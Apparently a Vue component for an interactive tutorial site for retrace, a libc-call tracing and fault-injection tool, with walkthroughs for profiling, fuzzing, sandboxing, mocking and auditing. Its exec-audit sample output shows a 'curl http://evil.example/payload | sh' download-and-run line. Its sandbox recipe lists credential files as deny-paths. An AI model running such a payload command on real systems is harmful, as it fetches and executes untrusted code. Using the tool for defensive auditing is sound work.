<script setup>
import { ref, computed } from "vue";

// Goal-oriented tags. Looked up by scenario id so the scenario
// definitions stay compact. A scenario can carry multiple tags.
const TAGS = {
  slow:      ["debug", "performance"],
  oom:       ["test", "fault"],
  sandbox:   ["security", "production"],
  reverse:   ["debug", "security", "reverse"],
  root:      ["test", "mock"],
  leak:      ["debug", "performance"],
  ci:        ["test", "ci", "fault"],
  android:   ["mobile"],
  netfail:   ["test", "fault"],
  time:      ["test", "mock"],
  redirect:  ["test", "mock"],
  envaudit:  ["security", "debug"],
  traffic:   ["security", "debug"],
  static:    ["debug", "reverse"],
  auditexec: ["security"],
  airgap:    ["security"],
  flamegraph:["performance", "debug"],
  locks:     ["performance", "debug"],
  custom:    ["extend", "ci"],
  prod:      ["debug", "production"],
  build:     ["ci", "test", "fault"],
  source:    ["extend"],
};

// Register tags that aren't auto-derived from scenarios (extend doesn't
// appear in any scenario's TAGS list otherwise).
const TAG_META = {
  debug:       { label: "Debugging",       accent: "see" },
  test:        { label: "Testing",         accent: "control" },
  security:    { label: "Security",        accent: "break" },
  performance: { label: "Performance",     accent: "see" },
  fault:       { label: "Fault injection", accent: "break" },
  mock:        { label: "Mocking",         accent: "control" },
  mobile:      { label: "Mobile",          accent: "control" },
  production:  { label: "Production-safe", accent: "see" },
  ci:          { label: "CI/CD",           accent: "break" },
  reverse:     { label: "Reverse eng.",    accent: "see" },
  extend:      { label: "Extend",          accent: "control" },
};

// Each scenario is a clickable card. Selecting one reveals the
// step-by-step walkthrough. Steps carry a description, a command
// (optional, copyable), and an expected result.
const scenarios = [
  {
    id: "slow",
    title: "Find what's making my program slow",
    icon: "⌛",
    accent: "see",
    summary: "Trace every libc call with timings, then sort by total time.",
    minutes: 5,
    steps: [
      {
        what: "Install retrace if you haven't already.",
        cmd: "curl -sSL https://raw.githubusercontent.com/riboseinc/retrace/main/scripts/install.sh | sh",
        out: "retrace 2.1.0 installed",
      },
      {
        what: "Run your program under retrace with HTML output. The --html flag generates a self-contained interactive page.",
        cmd: "retrace trace --html --log /tmp/trace.json -- ./your-program",
        out: "wrote /tmp/retrace-43892.html",
      },
      {
        what: "Open the report.",
        cmd: "open /tmp/retrace-43892.html",
        out: "(browser opens with summary cards + filterable table)",
      },
      {
        what: "Look at the category breakdown. The biggest category by total time is your suspect. Click any function to filter the table.",
        out: "[ I/O ]   485 calls  32.1 ms (66%)\n[ MEM ]   412 calls   8.3 ms (17%)\n...",
      },
      {
        what: "For a CLI-only view of per-function totals, pretty-print the JSON log:",
        cmd: "retrace pp /tmp/trace.json | head -10",
        out: "open          48 calls   12.4ms total\nread         124 calls    8.7ms total\n...",
      },
    ],
  },
  {
    id: "oom",
    title: "Test how my code handles malloc failures",
    icon: "💥",
    accent: "break",
    summary: "Inject OOM at a configurable rate to find unhandled NULL returns.",
    minutes: 5,
    steps: [
      {
        what: "Start with the quick subcommand. 10% of mallocs will return NULL.",
        cmd: "retrace fuzz malloc --rate 0.1 -- ./your-program",
        out: "(program either handles NULLs gracefully, or crashes — that's the test)",
      },
      {
        what: "If it crashes, capture the trace to a log so you can replay:",
        cmd: "retrace fuzz malloc --rate 0.1 --log /tmp/fuzz.json -- ./your-program",
        out: "wrote log to /tmp/fuzz.json",
      },
      {
        what: "Make the failure deterministic so it reproduces run-to-run. Add a seed via JSON config:",
        cmd: 'echo \'{"intercept_scripts":[{"func_name":"malloc","actions":[{"action_name":"fuzzing_seed","action_params":{"seed":42}},{"action_name":"call_real"},{"action_name":"memory_fuzz","action_params":{"fail_rate":0.1}}]}]}\' > /tmp/fuzz.json',
        out: "",
      },
      {
        what: "Run with that config — every run with seed 42 will fail the same calls.",
        cmd: "retrace run --config /tmp/fuzz.json -- ./your-program",
        out: "(deterministic failures — file the bug)",
      },
      {
        what: "To also fuzz calloc and realloc, copy docs/cookbook/09-fuzz-malloc.json and tweak.",
        out: "(see cookbook recipe 09 for the full multi-allocator config)",
      },
    ],
  },
  {
    id: "sandbox",
    title: "Sandbox an untrusted binary",
    icon: "🛡️",
    accent: "break",
    summary: "Block file access by path deny-list at runtime — no SELinux or AppArmor required.",
    minutes: 4,
    steps: [
      {
        what: "Decide which paths the binary must not touch.",
        out: "/etc/shadow, /etc/sudoers, /root/.ssh/, ~/.aws/credentials",
      },
      {
        what: "Write a sandbox.json config. Apply sandbox to every path-accepting call you want gated.",
        cmd: `cat > /tmp/sandbox.json <<'EOF'
{
  "intercept_scripts": [
    { "func_name": "open",
      "actions": [{ "action_name": "sandbox",
        "action_params": { "deny_paths": ["/etc/shadow", "/etc/sudoers", "/root/.ssh/"] } }] },
    { "func_name": "openat",
      "actions": [{ "action_name": "sandbox",
        "action_params": { "deny_paths": ["/etc/shadow", "/etc/sudoers", "/root/.ssh/"] } }] }
  ]
}
EOF`,
        out: "",
      },
      {
        what: "Run the binary under the sandbox. Any denied access is logged.",
        cmd: "retrace run --config /tmp/sandbox.json -- ./untrusted-binary",
        out: "sandbox: DENIED '/etc/shadow'  (open returned -2 / ENOENT)",
      },
      {
        what: "Triage the log to confirm what the binary tried to access.",
        out: "(any 'DENIED' line is an attempted access the sandbox blocked)",
      },
    ],
  },
  {
    id: "reverse",
    title: "See what a binary actually does",
    icon: "🔍",
    accent: "see",
    summary: "Map every libc call of a closed-source binary without a disassembler.",
    minutes: 3,
    steps: [
      {
        what: "Trace every call (no func filter = wildcard). Pipe to a log.",
        cmd: "retrace trace --log /tmp/trace.json -- ./mystery-binary",
        out: "(binary runs; every libc call is captured)",
      },
      {
        what: "Filter the log to just file/network/process operations. Set RETRACE_LOGGER_ALLOWED_FUNCS:",
        cmd: "RETRACE_LOGGER_ALLOWED_FUNCS=open,openat,read,write,connect,execve,system retrace trace --log /tmp/io.json -- ./mystery-binary",
        out: "(only the listed functions appear in the log)",
      },
      {
        what: "Generate an interactive HTML report:",
        cmd: "retrace html /tmp/io.json -o /tmp/view.html && open /tmp/view.html",
        out: "(browser opens; filter by function name to drill down)",
      },
      {
        what: "Look for: unexpected files opened, outbound connects to surprising hosts, system() calls with shell metacharacters. Those are your leads.",
        out: "",
      },
    ],
  },
  {
    id: "root",
    title: "Make a binary think it's root (without sudo)",
    icon: "🎭",
    accent: "control",
    summary: "Override getuid / geteuid / getgid return values to test root-path code.",
    minutes: 2,
    steps: [
      {
        what: "Run the binary with mocked getuid. It returns 0 (root's uid).",
        cmd: "retrace mock getuid 0 -- ./check-root",
        out: "welcome, root  (binary took the root path)",
      },
      {
        what: "If the binary checks geteuid too, mock both via a small JSON config:",
        cmd: `cat > /tmp/root.json <<'EOF'
{
  "intercept_scripts": [
    { "func_name": "getuid",
      "actions": [{ "action_name": "modify_return_value_int",
        "action_params": { "retval_int": 0 } }] },
    { "func_name": "geteuid",
      "actions": [{ "action_name": "modify_return_value_int",
        "action_params": { "retval_int": 0 } }] }
  ]
}
EOF`,
        out: "",
      },
      {
        what: "Run with that config.",
        cmd: "retrace run --config /tmp/root.json -- ./check-root",
        out: "(binary now believes it's running as root)",
      },
    ],
  },
  {
    id: "leak",
    title: "Find a memory leak",
    icon: "💧",
    accent: "see",
    summary: "Count malloc/free imbalance per function — more mallocs than frees indicates a leak.",
    minutes: 6,
    steps: [
      {
        what: "Trace allocators and free. The default config logs every call.",
        cmd: "retrace trace malloc,calloc,realloc,free --log /tmp/alloc.json -- ./your-program",
        out: "(program runs; every allocator call is logged with the pointer)",
      },
      {
        what: "Pretty-print to see per-function counts:",
        cmd: "retrace pp /tmp/alloc.json | grep -E 'malloc|calloc|realloc|free'",
        out: "malloc    1247 calls\ncalloc      42 calls\nrealloc     18 calls\nfree      1198 calls",
      },
      {
        what: "Subtract frees from allocations. If malloc+calloc+realloc > free, you have a leak. The diff is the leak count.",
        out: "(1247 + 42 + 18) - 1198 = 109 outstanding allocations",
      },
      {
        what: "For a tight loop, capture a windowed trace: run for N seconds, send SIGINT, then diff against a fresh run. The persistent allocations between runs are the leak.",
        cmd: "timeout 10 retrace trace malloc,free --log /tmp/run1.json -- ./server &\n# ... wait, hit the server ...\ntimeout 10 retrace trace malloc,free --log /tmp/run2.json -- ./server\nretrace pp /tmp/run1.json > /tmp/run1.txt\nretrace pp /tmp/run2.json > /tmp/run2.txt\ndiff /tmp/run1.txt /tmp/run2.txt",
        out: "(any function whose count grew between runs is leaking)",
      },
    ],
  },
  {
    id: "ci",
    title: "Add fuzzing to my CI pipeline",
    icon: "🤖",
    accent: "break",
    summary: "A drop-in GitHub Action that catches OOM and short-IO bugs on every PR.",
    minutes: 10,
    steps: [
      {
        what: "Add a workflow file. The action installs retrace, runs your tests under fuzz, fails the build on crash.",
        cmd: `mkdir -p .github/workflows
cat > .github/workflows/retrace-fuzz.yml <<'EOF'
name: fuzz
on: [pull_request]
jobs:
  fuzz:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install retrace
        run: curl -sSL https://raw.githubusercontent.com/riboseinc/retrace/main/scripts/install.sh | sh
      - name: Run tests under fuzz
        run: retrace fuzz malloc --rate 0.05 --log /tmp/fuzz.json -- ./run-tests
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: retrace-fuzz-log
          path: /tmp/fuzz.json
EOF`,
        out: "",
      },
      {
        what: "Open a PR. The workflow runs your tests with 5% of mallocs failing. Any unhandled NULL crashes the test run.",
        out: "(CI fails if your code doesn't handle OOM gracefully)",
      },
      {
        what: "When a failure happens, download the artifact and replay locally with a fixed seed:",
        cmd: "gh run download <run-id> -n retrace-fuzz-log\n# extract the seed from the log, then:\nretrace run --config fuzz-seed-<N>.json -- ./run-tests",
        out: "(reproduces the exact failure locally)",
      },
      {
        what: "See docs/cookbook/19-ci-fuzzing.md for the complete drop-in workflow.",
        out: "",
      },
    ],
  },
  {
    id: "android",
    title: "Trace an Android app's native code",
    icon: "📱",
    accent: "control",
    summary: "Cross-compile retrace for arm64, push to device, trace via wrap.sh.",
    minutes: 20,
    steps: [
      {
        what: "Build retrace for arm64 Android using the NDK toolchain file.",
        cmd: "cmake -B build-android -DCMAKE_TOOLCHAIN_FILE=cmake/android-toolchain.cmake -DANDROID_ABI=arm64-v8a\ncmake --build build-android",
        out: "build-android/src/libretrace.so",
      },
      {
        what: "Push the library and a wrapper script to the device.",
        cmd: "adb push build-android/src/libretrace.so /data/local/tmp/\ncat > wrap.sh <<'EOF'\n#!/system/bin/sh\nexport LD_PRELOAD=/data/local/tmp/libretrace.so\nexec \"$@\"\nEOF\nadb push wrap.sh /data/local/tmp/",
        out: "",
      },
      {
        what: "For debuggable apps, set wrap.sh via the property. Then launch the app.",
        cmd: "adb shell setprop wrap.<package.name> LD_PRELOAD=/data/local/tmp/libretrace.so\nadb shell am start -n <package.name>/<activity>",
        out: "(app starts with retrace injected; traces flow to logcat)",
      },
      {
        what: "For production apps, use Magisk's Zygisk module mechanism. See docs/android.md for the full setup.",
        out: "",
      },
    ],
  },
  {
    id: "netfail",
    title: "Test how my code handles network failures",
    icon: "📡",
    accent: "break",
    summary: "Force connect() to fail with ECONNREFUSED or ENETUNREACH — without pulling the network cable.",
    minutes: 4,
    steps: [
      {
        what: "Decide which network error to inject. Common POSIX errnos: ECONNREFUSED=111, ENETUNREACH=101, ETIMEDOUT=110, EHOSTUNREACH=113.",
        out: "",
      },
      {
        what: "Write a config that overrides connect's return value to -111 (ECONNREFUSED). Without call_real, the real connect never runs.",
        cmd: `cat > /tmp/netfail.json <<'EOF'
{
  "intercept_scripts": [
    { "func_name": "connect",
      "actions": [{ "action_name": "modify_return_value_int",
        "action_params": { "retval_int": -111 } }] }
  ]
}
EOF`,
        out: "",
      },
      {
        what: "Run your client under the fault. Every outbound connect() returns -111 immediately.",
        cmd: "retrace run --config /tmp/netfail.json -- ./your-client",
        out: "connect: Connection refused (os error 111)",
      },
      {
        what: "If your client has retry / fallback logic, this is how you test it without iptables or a flaky WiFi.",
        out: "",
      },
      {
        what: "To fail only specific destinations, combine with sandbox or write a custom action that inspects the sockaddr. See docs/configuration.md.",
        out: "",
      },
    ],
  },
  {
    id: "time",
    title: "Mock the system clock for time-sensitive tests",
    icon: "🕒",
    accent: "control",
    summary: "Freeze time, shift it, or replay a sequence — for testing expiry, schedules, and TTLs.",
    minutes: 3,
    steps: [
      {
        what: "Override time() to always return a fixed timestamp (Unix epoch seconds).",
        cmd: `retrace mock time 1735689600 -- ./your-program
# or, equivalently:
echo '{"intercept_scripts":[{"func_name":"time","actions":[{"action_name":"modify_return_value_int","action_params":{"retval_int":1735689600}}]}]}' > /tmp/freeze.json
retrace run --config /tmp/freeze.json -- ./your-program`,
        out: "(program now believes it's 2025-01-01 00:00:00 UTC)",
      },
      {
        what: "Most programs also call gettimeofday() or clock_gettime(). Mock them too:",
        cmd: `cat > /tmp/freeze.json <<'EOF'
{
  "intercept_scripts": [
    { "func_name": "time",      "actions": [{ "action_name": "modify_return_value_int", "action_params": { "retval_int": 1735689600 } }] },
    { "func_name": "gettimeofday", "actions": [{ "action_name": "call_real" }] }
  ]
}
EOF`,
        out: "(extend as needed — clock_gettime uses a struct, which requires a custom action to fully mock)",
      },
      {
        what: "Verify your time-sensitive logic: token expiry, schedule triggers, rate-limit windows.",
        out: "(tests that depended on `sleep` now run instantly and deterministically)",
      },
    ],
  },
  {
    id: "redirect",
    title: "Redirect a file path to somewhere else",
    icon: "🔀",
    accent: "control",
    summary: "Swap /etc/config for /tmp/fake without modifying the binary or root filesystem.",
    minutes: 3,
    steps: [
      {
        what: "Use modify_in_param_str to rewrite the path argument before open runs.",
        cmd: `cat > /tmp/redirect.json <<'EOF'
{
  "intercept_scripts": [
    { "func_name": "open",
      "actions": [
        { "action_name": "modify_in_param_str",
          "action_params": { "param_name": "path", "match_str": "/etc/config", "new_str": "/tmp/fake-config" } },
        { "action_name": "call_real" }
      ] }
  ]
}
EOF`,
        out: "",
      },
      {
        what: "Prepare the fake file at the new path.",
        cmd: "echo 'debug = true' > /tmp/fake-config",
        out: "",
      },
      {
        what: "Run the binary. Every open(\"/etc/config\") is transparently redirected to /tmp/fake-config.",
        cmd: "retrace run --config /tmp/redirect.json -- ./your-program",
        out: "(binary reads your fake config — no root, no chroot, no namespace)",
      },
      {
        what: "This is also how you A/B test config files, swap certificates, or feed known-bad inputs to parsers.",
        out: "",
      },
    ],
  },
  {
    id: "envaudit",
    title: "Audit what environment variables a binary reads",
    icon: "🗝️",
    accent: "see",
    summary: "Map every getenv() call a binary makes — catch secret leaks, config sniffing, debug backdoors.",
    minutes: 2,
    steps: [
      {
        what: "Trace getenv specifically. Each call's argument is the variable name being read.",
        cmd: "retrace trace getenv --log /tmp/env.json -- ./your-program",
        out: "(program runs; every getenv call is captured with its argument)",
      },
      {
        what: "Pretty-print to see which variables were read, in order:",
        cmd: "retrace pp /tmp/env.json",
        out: "getenv      42 calls\n  getenv(name=PATH)\n  getenv(name=HOME)\n  getenv(name=LD_LIBRARY_PATH)\n  getenv(name=DEBUG)         ← suspicious\n  getenv(name=SECRET_TOKEN)  ← very suspicious\n  ...",
      },
      {
        what: "Anything sensitive in that list is a finding. Document it; report it; or feed it garbage via modify_in_param_str to test handling.",
        out: "(does the binary crash on a malformed env value? does it leak it to a log?)",
      },
      {
        what: "Same pattern works for tracing execve (what commands does it spawn?), system (what shell does it run?), dlopen (what libraries does it load at runtime?).",
        out: "",
      },
    ],
  },
  {
    id: "traffic",
    title: "Capture all network traffic as JSON",
    icon: "📥",
    accent: "see",
    summary: "Log every send/recv with payload — a pcap-style stream without tcpdump or root.",
    minutes: 3,
    steps: [
      {
        what: "Trace send, sendto, recv, recvfrom, write (for sockets), read (for sockets).",
        cmd: "retrace trace send,sendto,recv,recvfrom --log /tmp/net.json -- ./your-server",
        out: "(server runs; every network I/O is captured)",
      },
      {
        what: "Pretty-print to see per-call summaries:",
        cmd: "retrace pp /tmp/net.json | head -10",
        out: "sendto    248 calls   2.1 MB total\nrecvfrom  247 calls   1.8 MB total\n...",
      },
      {
        what: "For full payloads, generate an interactive HTML view and filter by function:",
        cmd: "retrace html /tmp/net.json -o /tmp/net.html && open /tmp/net.html",
        out: "(browser opens; click any row to see args including buffer addresses)",
      },
      {
        what: "Compare to tcpdump: no root required, payloads are linked to the calling code, and you can mix in malloc/open traces for full context.",
        out: "",
      },
    ],
  },
  {
    id: "static",
    title: "Trace a statically-linked binary",
    icon: "🧱",
    accent: "see",
    summary: "LD_PRELOAD doesn't work on static binaries. Use the ptrace backend instead.",
    minutes: 8,
    steps: [
      {
        what: "Confirm the binary is statically linked. If it has no INTERP segment, LD_PRELOAD can't intercept it.",
        cmd: "file ./your-static-binary\n# ./your-static-binary: ELF ... statically linked",
        out: "",
      },
      {
        what: "Build retrace with the ptrace backend enabled.",
        cmd: "cmake -B build -DRETRACE_BACKEND_PTRACE=ON\ncmake --build build",
        out: "build/src/backends/ptrace/libretrace_ptrace.so",
      },
      {
        what: "Use the ptrace launcher. It attaches to the target, sets breakpoints on libc entry points, and reconstructs the calls.",
        cmd: "retrace ptrace --log /tmp/trace.json -- ./your-static-binary",
        out: "(binary runs; libc calls captured via ptrace)",
      },
      {
        what: "Caveat: ptrace is slower than LD_PRELOAD (each call is a context switch). Reserve it for static binaries; use preload everywhere else.",
        out: "",
      },
      {
        what: "See src/backends/ptrace/README.md for the full ptrace backend reference.",
        out: "",
      },
    ],
  },
  {
    id: "auditexec",
    title: "Audit system() and execve() calls",
    icon: "⚠️",
    accent: "break",
    summary: "Find every shell command and subprocess a binary spawns — critical for setuid and CGI audits.",
    minutes: 3,
    steps: [
      {
        what: "Trace every process-spawning libc call. Capture to a log so you can replay.",
        cmd: "retrace trace system,popen,execve,execvp,execl --log /tmp/exec.json -- ./your-binary",
        out: "(binary runs; every subprocess invocation is captured with its full argument list)",
      },
      {
        what: "Pretty-print to see what got spawned:",
        cmd: "retrace pp /tmp/exec.json",
        out: "system       3 calls\n  system(cmd=sh -c 'curl http://evil.example/payload | sh')\n  ...\nexecve      12 calls\n  execve(argv=[/bin/sh, -c, ...])\n  ...",
      },
      {
        what: "Any system() call with shell metacharacters, user-controlled input, or absolute paths to /tmp is a finding. CWE-78 (OS Command Injection).",
        out: "",
      },
      {
        what: "If the binary is setuid or runs as a server, every finding is potentially exploitable. File a CVE-worthy report.",
        out: "",
      },
    ],
  },
  {
    id: "airgap",
    title: "Verify a binary makes no outbound network calls",
    icon: "🔒",
    accent: "see",
    summary: "Confirm a binary is genuinely offline — no telemetry, no auto-update, no phone-home.",
    minutes: 4,
    steps: [
      {
        what: "Trace every network-related libc function. Empty log = no outbound calls.",
        cmd: "retrace trace connect,send,sendto,sendmsg,write --log /tmp/net.json -- ./your-binary",
        out: "(binary runs to completion; log captures any network activity)",
      },
      {
        what: "Check the log is empty (or only contains expected calls):",
        cmd: "retrace pp /tmp/net.json",
        out: "(if empty: the binary made zero outbound calls — confirmed airgapped)",
      },
      {
        what: "If you see unexpected connects, examine the destination addresses in the trace:",
        cmd: "grep connect /tmp/net.json",
        out: "{'func':'connect','args':{'addr':'93.184.216.34:443'}, ...}  ← unexpected",
      },
      {
        what: "To enforce airgap going forward (not just observe), pair with the sandbox action to deny connect outright. See tutorial #3.",
        out: "",
      },
    ],
  },
  {
    id: "flamegraph",
    title: "Generate a flamegraph of libc calls",
    icon: "🔥",
    accent: "control",
    summary: "Visualize which libc calls dominate — the SVG bar chart every performance investigation needs.",
    minutes: 5,
    steps: [
      {
        what: "Trace every call with timing. The log will include call_duration_us per call.",
        cmd: "retrace trace --log /tmp/trace.json -- ./your-program",
        out: "",
      },
      {
        what: "Use the bundled flamegraph tool to convert the JSON log into an SVG:",
        cmd: "python3 tools/flamegraph/flamegraph.py /tmp/trace.json > /tmp/flame.svg",
        out: "(writes a self-contained SVG bar chart)",
      },
      {
        what: "Open the SVG in a browser.",
        cmd: "open /tmp/flame.svg",
        out: "(widest bars = the libc calls that consumed the most total time)",
      },
      {
        what: "Search inside the SVG for a specific function name to find its slice. Click any slice to zoom.",
        out: "(flamegraph is interactive — explore to find your hot path)",
      },
      {
        what: "Requires Python 3 only for the visualization step. The trace itself is pure C; the flamegraph is just one way to render the JSON log.",
        out: "",
      },
    ],
  },
  {
    id: "locks",
    title: "Profile lock contention",
    icon: "🔒",
    accent: "see",
    summary: "Find which mutexes your threads are fighting over — without perf or DTrace.",
    minutes: 4,
    steps: [
      {
        what: "Trace every pthread mutex call with timing. Lock/unlock pairs reveal contention.",
        cmd: "retrace trace pthread_mutex_lock,pthread_mutex_unlock --log /tmp/locks.json -- ./your-threaded-program",
        out: "(program runs; every lock/unlock is captured with duration)",
      },
      {
        what: "Find the slowest lock acquisitions (long duration = high contention):",
        cmd: "retrace pp /tmp/locks.json | grep -E 'mutex' | head -5",
        out: "pthread_mutex_lock     842 calls   487.3ms total\npthread_mutex_unlock    842 calls     2.1ms total",
      },
      {
        what: "Total lock time minus total unlock time = time spent waiting. The function with the biggest gap is your bottleneck.",
        out: "487.3ms - 2.1ms = 485.2ms of contention (out of how much wall time?)",
      },
      {
        what: "For finer detail (which call site is contended), pair with a debugger or use the return-address routing pattern (cookbook recipe 17, planned).",
        out: "",
      },
    ],
  },
  {
    id: "custom",
    title: "Write a custom action",
    icon: "🛠️",
    accent: "control",
    summary: "Extend retrace with your own action — a single .c file that registers itself.",
    minutes: 25,
    steps: [
      {
        what: "Actions live in src/core/actions/. Each is a .c file that defines a struct RetraceAction and registers via the RETRACE_ACTION_REGISTER macro.",
        out: "src/core/actions/basic.c     -- log_params, call_real, modify_in_*, modify_return_value_int\nsrc/core/actions/memfuzz.c     -- memory_fuzz\nsrc/core/actions/incomplete_io.c -- incomplete_io\n...",
      },
      {
        what: "Pick a src/core/actions/*.c file like basic.c as a template. The interface you implement is per-action: parse your JSON params, decide whether to mutate the call, set the return value.",
        out: "",
      },
      {
        what: "Drop your new file in. Add an entry to Make-equivalent / CMakeLists (the build system auto-includes the directory).",
        cmd: "ls src/core/actions/\n# add your heuristic_action.c alongside the others",
        out: "",
      },
      {
        what: "Build and run. Your action is now first-class: it shows up in `retrace list-actions` and can be referenced in any JSON config.",
        cmd: "cmake --build build\nretrace run --config your-config.json -- ./your-target",
        out: "your action runs at every call to the function it intercepts",
      },
      {
        what: "For the full interface definition, see include/retrace/retrace_action.h and the existing actions in src/core/actions/.",
        out: "",
      },
    ],
  },
  {
    id: "prod",
    title: "Debug a production issue (safely)",
    icon: "🚑",
    accent: "see",
    summary: "Capture a production trace without restarting or modifying the binary — only the path you care about.",
    minutes: 15,
    steps: [
      {
        what: "Decide which functions are relevant. Logging everything in production is overkill; restrict to the suspects.",
        cmd: "RETRACE_LOGGER_ALLOWED_FUNCS=open,openat,read,write,connect,recv,send",
        out: "",
      },
      {
        what: "Limit the trace to a short window. A 60-second slice is enough to catch a slow path; a full hour is enough to fill a disk.",
        cmd: "timeout 60 retrace trace --log /tmp/incident.json -- ./your-service &\nPID=$!\n# ... wait, gather data, then:\nwait $PID",
        out: "(trace stops after 60 seconds; log is bounded)",
      },
      {
        what: "Scrub before persisting. The log may contain PII, secrets, or sensitive paths. Run a grep -v pass for known-sensitive patterns.",
        cmd: "grep -v 'SECRET\\|password\\|/etc/shadow' /tmp/incident.json > /tmp/incident-scrubbed.json",
        out: "(scrubbed file is safe to share with the post-mortem author)",
      },
      {
        what: "Analyze locally with the HTML viewer.",
        cmd: "retrace html /tmp/incident-scrubbed.json -o /tmp/postmortem.html && open /tmp/postmortem.html",
        out: "(interactive page; filter by function, sort by duration, find the outlier)",
      },
      {
        what: "The critical safety step: NEVER set RETRACE_LOGGER_DEF_ENA=1 with write access to the log file from the same user as the target. Stash everything in a directory only root can read.",
        out: "",
      },
    ],
  },
  {
    id: "build",
    title: "Integrate retrace into your build",
    icon: "🏗️",
    accent: "control",
    summary: "Run the test suite under retrace-fault-injection on every CI build. Catch error-path bugs before users do.",
    minutes: 20,
    steps: [
      {
        what: "Add a `fuzz-test` target to your project's build system that runs the test suite under a deterministic fuzz.",
        cmd: "make fuzz-test\n# which is, in your Makefile:\n# fuzz-test: tests\n# \tLD_PRELOAD=$$RETRACE_LIB retrace fuzz malloc --rate 0.05 \\\\\n# \t  --log test-output/fuzz.json -- ./run-tests",
        out: "",
      },
      {
        what: "Or, in CMake, add a custom target that wires the library automatically:",
        cmd: "add_custom_target(fuzz-test\n    COMMAND $<TARGET_FILE:run-tests>\n    ENVIRONMENT LD_PRELOAD=$<TARGET_FILE:libretrace.so>\n    COMMAND retrace fuzz malloc --rate 0.05\n    USES_TERMINAL)\nadd_dependencies(fuzz-test run-tests)",
        out: "",
      },
      {
        what: "Run it locally first to confirm your tests survive 5% OOM. If they crash, that's the bug you wanted to catch.",
        cmd: "make fuzz-test",
        out: "(either tests pass cleanly, or you find a handlenull-on-failure path that needs fixing)",
      },
      {
        what: "Wire it into CI. See the retrace-fuzz.yml workflow in the cookbook recipe 19 — a drop-in GitHub Actions workflow that runs on every PR.",
        out: "",
      },
      {
        what: "When a CI fuzz run fails, the seed is captured in the log. Replay locally with the fixed seed to debug.",
        out: "",
      },
    ],
  },
  {
    id: "source",
    title: "Build retrace from source",
    icon: "📦",
    accent: "control",
    summary: "Skip the install script — clone, build, install in three commands. CMake + Ninja.",
    minutes: 10,
    steps: [
      {
        what: "Clone the repository.",
        cmd: "git clone https://github.com/riboseinc/retrace.git\ncd retrace",
        out: "",
      },
      {
        what: "Configure with CMake. Ninja is the recommended generator (faster, handles the per-arch trampoline objects cleanly).",
        cmd: "cmake -B build -G Ninja -DRETRACE_BUILD_TESTS=ON",
        out: "(CMake probes feature flags and writes build/config.h from cmake/config.h.cmake.in)",
      },
      {
        what: "Build. The default target produces libretrace.so / .dylib / .dll and the retrace CLI binary.",
        cmd: "cmake --build build",
        out: "build/src/libretrace.so\nbuild/src/cli/retrace",
      },
      {
        what: "Run the test suite to confirm your build is healthy.",
        cmd: "ctest --test-dir build --output-on-failure",
        out: "(all tests pass on a clean checkout on supported platforms)",
      },
      {
        what: "Install system-wide (optional — you can also use the build output directly via RETRACE_LIB).",
        cmd: "sudo cmake --install build\n# which puts:\n#   /usr/local/lib/libretrace.so\n#   /usr/local/bin/retrace",
        out: "",
      },
      {
        what: "For build options (sanitizers, vcpkg, Android NDK cross-compile, OHOS, Windows arm64, static ptrace backend), see CMakeLists.txt and the platform-specific toolchain files under cmake/.",
        out: "",
      },
    ],
  },
];

const selectedId = ref(scenarios[0].id);
const selected = computed(() =>
  scenarios.find((s) => s.id === selectedId.value)
);

// Search + tag filter state.
const query = ref("");
const activeTags = ref([]);

const availableTags = computed(() => {
  // Only show tags that at least one scenario uses.
  const used = new Set();
  for (const s of scenarios) {
    for (const t of TAGS[s.id] || []) used.add(t);
  }
  return Array.from(used)
    .map((t) => ({ id: t, ...TAG_META[t] }))
    .sort((a, b) => a.label.localeCompare(b.label));
});

const filteredScenarios = computed(() => {
  const q = query.value.trim().toLowerCase();
  const tags = activeTags.value;
  return scenarios.filter((s) => {
    if (q && !s.title.toLowerCase().includes(q) && !s.summary.toLowerCase().includes(q)) {
      return false;
    }
    if (tags.length === 0) return true;
    const sTags = TAGS[s.id] || [];
    return tags.every((t) => sTags.includes(t));
  });
});

function select(id) {
  selectedId.value = id;
}

function toggleTag(tag) {
  const i = activeTags.value.indexOf(tag);
  if (i === -1) {
    activeTags.value = [...activeTags.value, tag];
  } else {
    activeTags.value = activeTags.value.filter((t) => t !== tag);
  }
}

function clearFilters() {
  query.value = "";
  activeTags.value = [];
}

// Watch filtered list: if the currently-selected scenario gets
// filtered out, jump to the first visible one.
import { watch } from "vue";
watch(filteredScenarios, (list) => {
  if (list.length > 0 && !list.find((s) => s.id === selectedId.value)) {
    selectedId.value = list[0].id;
  }
});

async function copyCmd(cmd) {
  if (!cmd) return;
  try {
    await navigator.clipboard.writeText(cmd);
  } catch (e) {
    const ta = document.createElement("textarea");
    ta.value = cmd;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand("copy"); } catch (_) {}
    document.body.removeChild(ta);
  }
}
</script>

<template>
  <div class="tutorial-grid">
    <aside class="scenario-rail">
      <div class="filter-block">
        <div class="search-wrap">
          <input
            v-model="query"
            type="search"
            class="search-input"
            placeholder="Search tutorials…"
            aria-label="Search tutorials"
          />
          <span class="search-icon" aria-hidden="true">⌕</span>
        </div>
        <div class="tag-row">
          <button
            v-for="t in availableTags"
            :key="t.id"
            :class="['tag-chip', `accent-${t.accent}`, { active: activeTags.includes(t.id) }]"
            @click="toggleTag(t.id)"
          >
            {{ t.label }}
          </button>
        </div>
        <div v-if="query || activeTags.length" class="filter-meta">
          <span>{{ filteredScenarios.length }} of {{ scenarios.length }} tutorials</span>
          <button class="clear-btn" @click="clearFilters">clear</button>
        </div>
      </div>

      <div class="rail-label">Pick your scenario</div>
      <ul class="scenario-list">
        <li v-if="filteredScenarios.length === 0" class="empty">
          No tutorials match. <button class="clear-btn" @click="clearFilters">clear filters</button>
        </li>
        <li
          v-for="s in filteredScenarios"
          :key="s.id"
          :class="['scenario-item', `accent-${s.accent}`, { active: s.id === selectedId }]"
          @click="select(s.id)"
        >
          <span class="scenario-icon">{{ s.icon }}</span>
          <span class="scenario-text">
            <span class="scenario-title">{{ s.title }}</span>
            <span class="scenario-meta">{{ s.minutes }} min · {{ s.accent }}</span>
          </span>
        </li>
      </ul>
    </aside>

    <div :class="['walkthrough-pane', `accent-${selected.accent}`]">
      <header class="walk-head">
        <div class="walk-eyebrow">{{ selected.icon }} {{ selected.accent }}</div>
        <h3>{{ selected.title }}</h3>
        <p class="walk-summary">{{ selected.summary }}</p>
        <div class="walk-tags">
          <span v-for="t in (TAGS[selected.id] || [])" :key="t" :class="['walk-tag', `accent-${TAG_META[t].accent}`]">
            {{ TAG_META[t].label }}
          </span>
        </div>
